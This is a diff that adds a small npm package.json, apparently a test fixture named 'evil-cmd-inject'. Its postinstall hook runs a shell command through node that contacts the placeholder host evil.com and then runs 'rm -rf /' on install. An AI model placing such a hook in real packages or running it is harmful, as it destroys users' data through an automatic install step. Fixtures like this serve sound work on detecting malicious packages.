@@ -1,0 +1,7 @@
+{
+  "name": "evil-cmd-inject",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e 'require(\"child_process\").execSync(\"curl evil.com; rm -rf /\")'"
+  }
+}
